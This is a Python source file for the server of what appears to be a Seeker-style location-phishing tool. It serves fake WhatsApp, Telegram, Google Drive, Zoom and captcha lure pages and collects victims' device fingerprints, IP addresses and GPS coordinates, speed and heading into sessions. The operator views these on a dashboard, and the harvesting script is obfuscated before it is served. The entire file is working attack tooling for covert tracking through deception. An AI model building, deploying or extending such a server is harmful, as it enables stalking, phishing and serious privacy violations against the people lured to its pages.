#!/usr/bin/env python3

import json
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import parse_qs
from session import SessionManager


class SeekerHandler(SimpleHTTPRequestHandler):
    session_manager: SessionManager = None
    _template_dir: str = None
    _config: dict = None

    def __init__(self, request, client_address, server):
        super().__init__(request, client_address, server, directory=self.__class__._template_dir)

    def log_message(self, format, *args):
        pass

    def _get_client_ip(self):
        ip = self.headers.get('CF-Connecting-IP')
        if ip:
            return ip
        ip = self.headers.get('X-Forwarded-For')
        if ip:
            return ip.split(',')[0].strip()
        ip = self.headers.get('X-Real-IP')
        if ip:
            return ip
        return self.client_address[0]

    def _parse_post_data(self):
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            return {}
        body = self.rfile.read(content_length).decode('utf-8')
        content_type = self.headers.get('Content-Type', '')
        if 'application/json' in content_type:
            try:
                return json.loads(body)
            except Exception:
                return {}
        return parse_qs(body)

    def _send_json(self, data, status=200):
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self._send_cors_headers()
        self.end_headers()
        self.wfile.write(body)

    def _send_cors_headers(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')

    def do_OPTIONS(self):
        self.send_response(200)
        self._send_cors_headers()
        self.end_headers()

    def do_POST(self):
        path = self.path.split('?')[0]
        data = self._parse_post_data()
        client_ip = self._get_client_ip()

        if path == '/api/template':
            self._handle_template_switch(data)
            return

        flat = {k: v[0] if isinstance(v, list) and len(v) == 1 else v for k, v in data.items()}

        if path == '/info_handler':
            self._handle_info(client_ip, flat)
        elif path == '/result_handler':
            self._handle_result(client_ip, flat)
        elif path == '/error_handler':
            self._handle_error(client_ip, flat)
        else:
            self.send_response(404)
            self.end_headers()
            return

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self._send_cors_headers()
        self.end_headers()
        self.wfile.write(b'OK')

    def _handle_info(self, client_ip, data):
        info = {
            'os': data.get('Os', 'Not Available'),
            'platform': data.get('Ptf', 'Not Available'),
            'browser': data.get('Brw', 'Not Available'),
            'cores': data.get('Cc', 'Not Available'),
            'ram': data.get('Ram', 'Not Available'),
            'vendor': data.get('Ven', 'Not Available'),
            'render': data.get('Ren', 'Not Available'),
            'ip': client_ip,
            'ht': data.get('Ht', 'Not Available'),
            'wd': data.get('Wd', 'Not Available'),
        }
        if self.session_manager:
            self.session_manager.update_info(client_ip, info)

    def _handle_result(self, client_ip, data):
        location = {
            'status': data.get('Status', 'failed'),
            'lat': data.get('Lat', 'Not Available'),
            'lon': data.get('Lon', 'Not Available'),
            'acc': data.get('Acc', 'Not Available'),
            'alt': data.get('Alt', 'Not Available'),
            'dir': data.get('Dir', 'Not Available'),
            'spd': data.get('Spd', 'Not Available'),
        }
        if self.session_manager:
            self.session_manager.update_location(client_ip, location)

    def _handle_error(self, client_ip, data):
        error = {
            'status': data.get('Status', 'failed'),
            'error': data.get('Error', 'Unknown error'),
        }
        if self.session_manager:
            self.session_manager.update_error(client_ip, error)

    # Default env vars for templates that need interactive input
    _template_defaults = {
        'gdrive': {
            'REDIRECT': 'https://drive.google.com/file/d/example/view',
        },
        'whatsapp': {
            'TITLE': 'Private Group',
            'IMAGE': 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg',
        },
        'whatsapp_redirect': {
            'TITLE': 'WhatsApp Group',
            'IMAGE': 'https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg',
            'REDIRECT': 'https://chat.whatsapp.com/example',
        },
        'telegram': {
            'TITLE': 'Telegram Group',
            'IMAGE': 'https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg',
            'DESC': 'Welcome to our group',
            'MEM_NUM': '1,258',
            'ONLINE_NUM': '342',
        },
        'zoom': {},
        'captcha': {
            'REDIRECT': 'https://www.google.com/',
            'DISPLAY_URL': 'https://www.google.com/',
        },
        'custom_og_tags': {
            'REDIRECT': 'https://example.com',
            'SITENAME': 'Example',
            'TITLE': 'Example Page',
            'IMAGE': 'https://via.placeholder.com/1200x630',
            'DESC': 'Example description',
        },
        'university': {},
    }

    def _handle_template_switch(self, data):
        """Handle template switching from dashboard."""
        import shutil
        tpl_idx = data.get('template')
        if tpl_idx is None:
            self._send_json({'status': 'error', 'error': 'Missing template index'}, 400)
            return

        base_dir = os.path.dirname(os.path.abspath(__file__))
        templates_json = os.path.join(base_dir, 'template', 'templates.json')

        try:
            with open(templates_json, 'r') as f:
                tpl_data = json.loads(f.read())

            templates = tpl_data.get('templates', [])
            if tpl_idx < 0 or tpl_idx >= len(templates):
                self._send_json({'status': 'error', 'error': 'Invalid template index'}, 400)
                return

            selected = templates[tpl_idx]
            dir_name = selected['dir_name']
            import_file = selected['import_file']
            tpl_dir = os.path.join(base_dir, 'template', dir_name)

            if not os.path.isdir(tpl_dir):
                self._send_json({'status': 'error', 'error': f'Template directory not found: {dir_name}'}, 400)
                return

            # Set default env vars so modules don't block on input()
            # Save and restore to avoid leaking between switches
            defaults = self._template_defaults.get(dir_name, {})
            saved_env = {}
            all_keys = set(defaults.keys()) | {'REDIRECT', 'TITLE', 'DESC', 'IMAGE',
                'SITENAME', 'MEM_NUM', 'ONLINE_NUM', 'DISPLAY_URL'}
            for key in all_keys:
                saved_env[key] = os.environ.get(key)
                if key in defaults:
                    os.environ[key] = defaults[key]
                elif key in os.environ:
                    del os.environ[key]
            os.environ['DEBUG_HTTP'] = '1'

            # Module imports use relative paths — must chdir to project root
            import importlib
            import sys
            old_cwd = os.getcwd()
            try:
                os.chdir(base_dir)
                module_name = f'template.{import_file}'
                if module_name in sys.modules:
                    del sys.modules[module_name]
                importlib.import_module(module_name)
            finally:
                os.chdir(old_cwd)
                # Restore env vars
                for key, val in saved_env.items():
                    if val is None:
                        os.environ.pop(key, None)
                    else:
                        os.environ[key] = val

            # Copy obfuscated JS
            js_dir = os.path.join(tpl_dir, 'js')
            if not os.path.isdir(js_dir):
                os.makedirs(js_dir)
            try:
                from obfuscate import obfuscate_js
                obfuscate_js('js/location.js', os.path.join(js_dir, 'location.js'))
            except Exception:
                src_js = os.path.join(base_dir, 'js', 'location.js')
                shutil.copyfile(src_js, os.path.join(js_dir, 'location.js'))

            # Update template directory for static serving
            self.__class__._template_dir = tpl_dir
            if self._config is not None:
                self._config['template'] = dir_name

            self._send_json({'status': 'ok', 'template': dir_name, 'name': selected['name']})
        except Exception as e:
            self._send_json({'status': 'error', 'error': str(e)}, 500)

    def do_GET(self):
        if self.path == '/health':
            self._send_json({'status': 'ok'})
            return

        if self.path == '/api/sessions':
            data = self.session_manager.get_sessions_dict() if self.session_manager else []
            self._send_json(data)
            return

        if self.path == '/api/config':
            cfg = self._config.copy() if self._config else {}
            self._send_json(cfg)
            return

        if self.path == '/dashboard':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self._send_cors_headers()
            self.end_headers()
            base_dir = os.path.dirname(os.path.abspath(__file__))
            # Prefer Chinese dashboard
            cn_path = os.path.join(base_dir, 'template', 'dashboard_cn.html')
            orig_path = os.path.join(base_dir, 'template', 'dashboard.html')
            dashboard_path = cn_path if os.path.isfile(cn_path) else orig_path
            with open(dashboard_path, 'rb') as f:
                self.wfile.write(f.read())
            return

        super().do_GET()


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def create_server(port, template_dir, session_manager, config=None):
    SeekerHandler.session_manager = session_manager
    SeekerHandler._template_dir = template_dir
    SeekerHandler._config = config or {}

    server = ThreadedHTTPServer(('0.0.0.0', port), SeekerHandler)
    return server
